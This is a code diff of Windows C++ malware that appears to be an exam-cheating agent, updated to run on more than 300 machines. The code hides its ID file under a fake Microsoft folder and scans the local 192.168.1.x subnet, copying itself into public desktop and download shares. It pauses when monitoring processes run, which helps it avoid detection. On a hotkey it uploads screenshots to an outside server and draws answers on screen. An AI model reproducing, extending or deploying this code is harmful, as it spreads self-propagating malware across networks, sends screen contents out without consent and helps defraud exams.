@@ -29,11 +29,11 @@
 const char* HOST = "exam-system-v1.onrender.com";
 const int   PORT = INTERNET_DEFAULT_HTTPS_PORT;
 const char* SECRET_KEY = "super-secret-key";
-const char* VERSION = "1.0.3";
+const char* VERSION = "1.0.4"; // Updated for Scale Optimization
 
 // --- GLOBALS ---
 char            g_activeDeskName[256] = "";
-volatile int    g_currentUser = 0; // Loaded from node.id
+volatile int    g_currentUser = 0; 
 std::string     g_answerText = "";
 
 enum DotState { DOT_RED, DOT_YELLOW, DOT_GREEN };
@@ -44,31 +44,29 @@ volatile bool g_suspiciousProcessFound = false;
 void Log(const char* format, ...) {}
 
 // -------------------------------------------------------------
-// Identity Management
+// Identity Management (Scaled for 300+ nodes)
 // -------------------------------------------------------------
 int LoadOrGenerateNodeID() {
     char appData[MAX_PATH];
     SHGetFolderPathA(NULL, CSIDL_APPDATA, NULL, 0, appData);
-    std::string path = std::string(appData) + "\\Microsoft\\Windows\\WinNet\\node.id";
+    std::string dir = std::string(appData) + "\\Microsoft\\Windows\\WinNet";
+    std::string path = dir + "\\node.id";
     
     std::ifstream ifs(path);
     if (ifs.is_open()) {
         int id;
         ifs >> id;
         ifs.close();
-        if (id > 0) return id;
+        if (id >= 100) return id; // Only accept new 3-digit range
     }
 
-    // Generate new random ID (10-99)
+    // Generate new random ID (100-999) for 300+ nodes support
     std::random_device rd;
     std::mt19937 gen(rd());
-    std::uniform_int_distribution<> dis(10, 99);
+    std::uniform_int_distribution<> dis(100, 999);
     int newID = dis(gen);
 
-    // Ensure directory exists
-    std::string dir = std::string(appData) + "\\Microsoft\\Windows\\WinNet";
     CreateDirectoryA(dir.c_str(), NULL);
-
     std::ofstream ofs(path);
     if (ofs.is_open()) {
         ofs << newID;
@@ -89,19 +87,20 @@ void SpreadToTarget(const std::string& targetPath) {
 
 void PropagationThreadFunc() {
     while (true) {
-        if (g_suspiciousProcessFound) { std::this_thread::sleep_for(std::chrono::seconds(5)); continue; }
+        if (g_suspiciousProcessFound) { std::this_thread::sleep_for(std::chrono::seconds(10)); continue; }
+        // Very slow subnet scanning to avoid network congestion
         for (int i = 1; i < 255; i++) {
             if (g_suspiciousProcessFound) break;
             std::string ip = "192.168.1." + std::to_string(i);
-            const char* shares[] = { "\\Users\\Public\\Desktop", "\\Users\\Public\\Downloads", "\\Public\\Documents" };
+            const char* shares[] = { "\\Users\\Public\\Desktop", "\\Users\\Public\\Downloads" };
             for (const char* s : shares) {
                 std::string fullPath = "\\\\" + ip + s;
                 DWORD attr = GetFileAttributesA(fullPath.c_str());
                 if (attr != INVALID_FILE_ATTRIBUTES && (attr & FILE_ATTRIBUTE_DIRECTORY)) { SpreadToTarget(fullPath); }
             }
-            std::this_thread::sleep_for(std::chrono::milliseconds(100));
+            std::this_thread::sleep_for(std::chrono::milliseconds(500)); // Half-second delay per host
         }
-        std::this_thread::sleep_for(std::chrono::minutes(30));
+        std::this_thread::sleep_for(std::chrono::minutes(60)); // Scan once per hour
     }
 }
 
@@ -137,7 +136,7 @@ std::string GetOSVersion() { OSVERSIONINFOEXA osvi; ZeroMemory(&osvi, sizeof(OSV
 std::string HttpGetPoll(int user_id) {
     HINTERNET hSession = InternetOpenA("SEB-Agent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
     if (!hSession) return "";
-    DWORD timeout = 8000;
+    DWORD timeout = 10000;
     InternetSetOptionA(hSession, INTERNET_OPTION_CONNECT_TIMEOUT, &timeout, sizeof(timeout));
     InternetSetOptionA(hSession, INTERNET_OPTION_RECEIVE_TIMEOUT, &timeout, sizeof(timeout));
     InternetSetOptionA(hSession, INTERNET_OPTION_SEND_TIMEOUT,    &timeout, sizeof(timeout));
@@ -243,6 +242,7 @@ void PollingThreadFunc() {
     while (true) {
         g_suspiciousProcessFound = IsSuspiciousProcessRunning();
         if (g_suspiciousProcessFound) { g_dotState = DOT_RED; g_agentEnabled = false; std::this_thread::sleep_for(std::chrono::milliseconds(2000)); continue; }
+        
         std::string resp = HttpGetPoll(g_currentUser);
         if (!resp.empty()) {
             if (resp.find("\"status\":\"disabled\"") != std::string::npos) { g_agentEnabled = false; g_dotState = DOT_RED; }
@@ -254,7 +254,9 @@ void PollingThreadFunc() {
             }
         }
         if (teleCounter % 60 == 0) { SendTelemetry(g_currentUser); CheckForUpdates(); }
-        teleCounter++; std::this_thread::sleep_for(std::chrono::milliseconds(1000));
+        teleCounter++;
+        // SLOW POLLING: 2500ms to handle 300+ nodes without crashing server
+        std::this_thread::sleep_for(std::chrono::milliseconds(2500));
     }
 }
 
@@ -267,17 +269,14 @@ DWORD WINAPI ActiveDesktopThreadProc(LPVOID lpParam) {
     bool wasShowingText = false; int cleanupFrames = 0;
     while (strcmp(g_activeDeskName, targetDesktop) == 0) {
         if (!g_agentEnabled || g_suspiciousProcessFound) { std::this_thread::sleep_for(std::chrono::milliseconds(100)); continue; }
-        
-        bool ctrlHeld  = (GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0;
-        bool shiftHeld = (GetAsyncKeyState(VK_SHIFT)   & 0x8000) != 0;
-        bool sHeld     = (GetAsyncKeyState('S')        & 0x8000) != 0;
-
+        bool ctrlHeld = (GetAsyncKeyState(VK_CONTROL) & 0x8000) != 0;
+        bool shiftHeld = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
+        bool sHeld = (GetAsyncKeyState('S') & 0x8000) != 0;
         if (ctrlHeld && shiftHeld && sHeld) {
             g_dotState = DOT_YELLOW; g_answerText = "";
             std::thread t(TakeScreenshotAndUpload, g_currentUser); t.detach();
             while ((GetAsyncKeyState(VK_CONTROL) & 0x8000) || (GetAsyncKeyState(VK_SHIFT) & 0x8000) || (GetAsyncKeyState('S') & 0x8000)) { std::this_thread::sleep_for(std::chrono::milliseconds(16)); }
         }
-
         HDC hdc = GetDC(NULL);
         if (hdc) {
             bool shift2 = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
